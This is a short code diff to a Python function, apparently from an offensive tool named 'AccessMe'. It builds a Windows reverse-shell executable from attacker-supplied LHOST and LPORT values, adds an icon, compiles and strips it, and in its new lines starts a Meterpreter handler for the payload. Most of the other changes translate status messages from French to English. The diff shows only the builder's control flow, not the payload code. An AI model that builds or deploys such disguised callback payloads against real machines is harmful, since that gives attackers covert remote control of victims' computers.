@@ -29,6 +29,7 @@ def Construction():
     Gen_Payload = True
 
     while Gen_Payload:
+
         LHOST = gen.LHOST_Input()
         LPORT = gen.LPORT_Input()
         FILENAME = "/root/AccessMe/Output/" + gen.FILENAME_Input() + ".exe"
@@ -48,16 +49,21 @@ def Construction():
         with open('source.c', 'w') as f:
             f.write(Final_Code)
 
-        print("Fichier généré")
+        print("[+] Code generated.")
 
         ICON = gen.Add_Icon()
 
-        print("Compiling")
+        print("[*] Compiling.")
 
         gen.Auto_Compiler(FILENAME, ARCH, PLATFORM, ICON)
 
-        print("Stripping")
+        print("[*] Stripping executable.")
 
         gen.Auto_Executable_Strip(FILENAME, PLATFORM)
+
+        gen.Run_Meterpreter_Script(ARCH, PLATFORM, RC_PAYLOAD, LHOST, LPORT)
+
+        print("[+] Complete task.")
+        print("[+] Exiting script.")
 
         Gen_Payload = False
